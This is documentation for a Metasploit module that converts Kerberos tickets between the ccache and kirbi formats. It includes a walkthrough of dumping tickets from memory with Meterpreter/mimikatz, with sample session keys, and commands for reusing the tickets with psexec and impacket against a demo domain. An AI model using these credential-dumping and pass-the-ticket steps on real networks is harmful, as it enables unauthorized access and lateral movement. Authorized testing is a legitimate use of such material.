## Converting Kerberos Tickets

The `auxiliary/admin/kerberos/ticket_converter` module is used to convert from a ccache file format to the kirbi file format and vice versa.
The main reason you may want to convert between these file types is for use in different tools.
For example mimikatz will create tickets for you in the kirbi format but to use that in another tool
like Metasploit or Impacket you need to convert it to the ccache format first.

## Acquiring tickets

Kerberos tickets can be acquired from multiple sources. For instance:

- Retrieved directly from the KDC with the `get_ticket` module
- Forged using the `forge_ticket` module after compromising the krbtgt or a service account's encryption keys
- Extracted from memory using Meterpreter and mimikatz:

```msf
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > kiwi_cmd "sekurlsa::tickets /export"

Authentication Id : 0 ; 1393218 (00000000:00154242)
Session           : Network from 0
User Name         : DC3$
Domain            : DEMO
Logon Server      : (null)
Logon Time        : 1/12/2023 9:11:00 PM
SID               : S-1-5-18

	 * Username : DC3$
	 * Domain   : DEMO.LOCAL
	 * Password : (null)

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?
	 [00000000]
	   Start/End/MaxRenew: 1/12/2023 7:41:41 PM ; 1/13/2023 5:37:45 AM ; 1/1/1601 12:00:00 AM
	   Service Name (02) : LDAP ; DC3 ; @ DEMO.LOCAL
	   Target Name  (--) : @ DEMO.LOCAL
	   Client Name  (01) : DC3$ ; @ DEMO.LOCAL
	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
	   Session Key       : 0x00000012 - aes256_hmac
	     ab64d555f18de6a3262d921e6dc75dcf884852f551db3114f7983dbaf276e1d6
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
====================
Base64 of file : [0;154242]-1-0-40a50000-DC3$@LDAP-DC3.kirbi
====================
doQAAAYXMIQAAAYRoIQAAAADAgEFoYQAAAADAgEWooQAAAS2MIQAAASwYYQAAASq
MIQAAASkoIQAAAADAgEFoYQAAAAMGwpBREYzLkxPQ0FMooQAAAAmMIQAAAAgoIQA
AAADAgECoYQAAAARMIQAAAALGwRMREFQGwNEQzOjhAAABFcwhAAABFGghAAAAAMC
... etc...
====================
```

Note that tools often Base64 encode the Kirbi content to display to the user. However the `inspect_ticket` module expects
the input file to be in binary format. To convert base64 strings to binary files:

```
# Linux
cat ticket.b64 | base64 -d > ticket.kirbi

# Mac
cat ticket.b64 | base64 -D > ticket.kirbi

# Powershell
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))
```

## Module usage

1. Start msfconsole
2. Do: `use auxiliary/admin/kerberos/ticket_converter`
3. Do: `set InputPath /path/to/ccache/or/kirbi/file`
4. Do: `set OutputPath /path/to/save/your/converted/file`
5. Do: `run`
6. You should see output similar to:
   ```
   [*] [2022.12.16-12:52:56] Converting from ccache to kirbi
   [*] [2022.12.16-12:52:56] File written to <OutputPath>
   [*] Auxiliary module execution completed
   ```
7. Your converted ticket which will have been stored at `OutputPath`
8. Example usage in Metasploit:
   ```
   use windows/smb/psexec
   run rhost=192.168.123.13 username=Administrator domaincontrollerrhost=192.168.123.1 smb::auth=kerberos smb::rhostname=host.demo.local smbdomain=demo.local smbkrb5ccname=/path/to/ccache/ticket 
   ```
9. Example usage in impacket:
   ```
   export KRB5CCNAME=/path/to/ccache/ticket
   python3 mssqlclient.py DW.LOCAL/fake_mysql@dc1.dw.local -k -no-pass
   ```
10. You may use the `inspect_ticket` module to prints the contents of the ccache/kirbi file:
   `use auxiliary/admin/kerberos/inspect_ticket`

## Scenarios

### You have a ccache file

If you have a ccache file, for example by forging it using the `auxiliary/admin/kerberos/forge_ticket` module,
but need a file in the kirbi format which is commonly used by mimikatz.

Set the `InputPath` to the location of your ccache file, specify your desired output location with `OutputPath` and `run`.
Metasploit will automatically detect the file type so there's no need to tell msfconsole whether it's a ccache or kirbi file.

Example:
```msf
msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=metasploit_ticket.ccache outputpath=metasploit_ticket.kirbi

[*] [2023.01.05-17:01:02] Converting from ccache to kirbi
[*] [2023.01.05-17:01:02] File written to /Users/dwelch/dev/metasploit-framework/metasploit_ticket.kirbi
[*] Auxiliary module execution completed
```

### You have a kirbi file

The other scenario is if you have a kirbi file, for example tools such as mimikatz will give you tickets in the kirbi format,
and you need a ccache for use with another tool such as Metasploit and Impacket.

The steps are exactly the same for a kirbi file as they are for a ccache as Metasploit will automatically detect the input file type.

Set the `InputPath` to the location of your ccache file, specify your desired output location with `OutputPath` and `run`.
Metasploit will automatically detect the file type so there's no need to tell msfconsole whether it's a ccache or kirbi file.

Example:
```msf
msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=metasploit_ticket.kirbi outputpath=metasploit_ticket.ccache

[*] [2023.01.05-17:01:39] Converting from kirbi to ccache
[*] [2023.01.05-17:01:39] File written to /Users/dwelch/dev/metasploit-framework/metasploit_ticket.ccache
[*] Auxiliary module execution completed
```
